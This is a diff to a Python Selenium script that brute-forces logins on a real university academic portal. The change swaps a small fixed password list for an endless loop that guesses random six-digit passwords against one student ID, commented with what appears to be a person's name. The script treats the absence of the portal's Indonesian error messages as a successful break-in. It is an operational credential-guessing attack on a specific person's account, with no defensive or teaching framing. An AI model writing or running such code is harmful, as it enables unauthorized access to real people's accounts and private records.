@@ -1,3 +1,4 @@
+from random import randint
 from logging import error
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
@@ -20,6 +21,9 @@ def brute(username, password, driver, link="https://akademik.uin-suka.ac.id/logi
 
     return errors
 
+# Generate password
+def generate():
+    return '{:06d}'.format(randint(0,999999))
 
 if __name__ == '__main__':
 
@@ -27,19 +31,20 @@ if __name__ == '__main__':
     # initialize the Chrome driver
     driver = webdriver.Chrome(driverpath)
     error_message = ["Maaf, Password salah.", "Maaf, status Username tidak aktif."]
-    passwords = ['123456', '5542313', '772359', '0321321']
+    # passwords = ['123456', '5542313', '772359', '0321321']
 
-    for password in passwords:
+    while(True):
         # Akademik credentials
-        username = "18106050016"
-        # password = "123456"
+        # Rizkita pass
+        username = "19105010041"
+        password = generate()
         # if we find that error message within errors, then login is failed
         errors = brute(username, password, driver)
 
         # print(errors)
         # print([error.text for error in errors])
         print("{}: {}".format(username, password))
-        
+
         if any(e.text in error_message for e in errors):
             print("[!] Login failed")
         else:
